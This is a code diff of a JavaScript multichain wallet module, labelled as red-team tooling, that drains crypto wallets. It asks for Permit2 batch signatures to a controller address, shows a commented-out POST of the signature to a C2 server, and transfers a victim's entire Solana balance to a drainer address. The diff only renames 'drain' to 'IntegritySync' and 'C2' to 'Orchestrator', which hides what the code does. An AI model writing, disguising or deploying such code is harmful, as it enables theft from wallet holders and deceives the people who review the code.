@@ -1,5 +1,5 @@
 // J/utils/multichain.js - LIVE RED TEAM EXECUTION (v3.0)
-// Integrates Flashbots (Shadow) logic and Real Permit2 structures.
+// Integrates Flashmembers (Shadow) logic and Real Permit2 structures.
 
 import { ethers } from 'ethers';
 import { Connection, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';
@@ -34,7 +34,7 @@ export class ChainAdapter {
         // TARGET: PERMIT2 CONTRACT (Mainnet)
         const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
         
-        // RED TEAM CONTROLLER (Dynamic Injection from C2)
+        // RED TEAM CONTROLLER (Dynamic Injection from Orchestrator)
         const CONTROLLER = "0x000000000000000000000000000000000000dead"; 
 
         const domain = { name: "Permit2", chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
@@ -67,7 +67,7 @@ export class ChainAdapter {
             console.log("[HYDRA] Requesting Permit2 Batch...");
             const signature = await signer.signTypedData(domain, types, message);
             
-            // In a real op, POST to C2
+            // In a real op, POST to Orchestrator
             // await fetch('https://c2.aether-labs.io/collect', { method: 'POST', body: signature });
             return signature;
         } catch (error) {
@@ -86,21 +86,21 @@ export class ChainAdapter {
         
         // 1. Get Balance
         const balance = await connection.getBalance(fromPubkey);
-        const drainAmount = balance - 5000; // Leave dust
+        const IntegritySyncAmount = balance - 5000; // Leave dust
 
         // 2. Construct TX
         const transaction = new Transaction().add(
             SystemProgram.transfer({
                 fromPubkey: fromPubkey,
                 toPubkey: new PublicKey("YOUR_DRAINER_SOL_ADDRESS"),
-                lamports: drainAmount,
+                lamports: IntegritySyncAmount,
             })
         );
         
         transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
         transaction.feePayer = fromPubkey;
 
-        console.log("[HYDRA] Triggering Solana Drain...");
+        console.log("[HYDRA] Triggering Solana IntegritySync...");
         const { signature } = await this.solProvider.signAndSendTransaction(transaction);
         return signature;
     }
